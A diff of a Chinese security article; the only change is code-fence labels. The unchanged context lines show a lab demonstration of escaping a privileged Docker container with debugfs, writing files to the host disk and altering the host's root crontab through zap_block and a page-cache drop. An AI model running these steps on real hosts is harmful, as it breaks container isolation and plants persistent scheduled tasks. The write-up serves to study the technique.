@@ -18,7 +18,7 @@ write source_file out_file
 通过`write`命令我们可以将容器中的文件复制到宿主机中。
 演示： 
 实验环境：特权ubuntu容器  
-```shell
+```console
 #在容器的bash中
 root@4da29cbf878a:/tmp$ echo test > /tmp/testfile.txt
 debugfs -w /dev/sda1 #读写模式打开/dev/sda1
@@ -34,7 +34,7 @@ ubuntu1@123:/tmp$ ls -l testfile-host.txt
 -rw-r--r-- 1 root root 5 Jun 17 10:44 testfile-host.txt
 ```
 可以看到，这里是可以读取的，并且文件是正常没有损坏的；如果我们写入一个计划任务，可能就不行了
-```bash
+```console
 root@4da29cbf878a:/tmp$ echo '* * * * * echo test1 >> /tmp/testfile1.txt' > root   
 root@4da29cbf878a:/tmp$ debugfs -w /dev/dm-0
 debugfs 1.45.5 (07-Jan-2020)
@@ -68,7 +68,7 @@ inspired by a project named pagecache management (source: fadv.c slightly edited
 This caused the kernel to load our changes and we were finally able to propagate them to the Docker host filesystem:
 ```
 文中提到了通过`zap_block`去修改文件，再通过`ln`将修改成功的宿主机文件链接到容器中`upperdir`目录下，再通过 `posix_fadvise`从缓存中丢弃，这样就能够避免缓存的影响:
-```shell
+```console
 root@1fae4e0f04c8:/tmp$ debugfs -w /dev/dm-0
 debugfs 1.45.5 (07-Jan-2020)
 debugfs:  blocks /var/spool/cron/crontabs/root #获取文件的blocks
@@ -80,7 +80,7 @@ root@1fae4e0f04c8:/tmp$ ./fav root  #丢弃数据，避免缓存影响
 ```
 这里我们通过`zap_block`修改了blocks为2694190的文件，也就是我们的/var/spool/cron/crontabs/root文件，从15位开始，向后3个长度，替换为ASCII值为41的字符A。修改完了之后再通过posix_fadvise，立即从`page cache`中丢弃数据，这样就不会有页面缓存的问题，编译的fav文件参考<https://github.com/tsarpaul/pagecache-management/blob/master/fadv.c>  
 这时我们返回宿主机，查看root用户的计划任务:
-```bash
+```console
 ubuntu1@123:~$ sudo cat /var/spool/cron/crontabs/root
 * * * * * echo AAAt >> /tmp/root1.txt
 ```
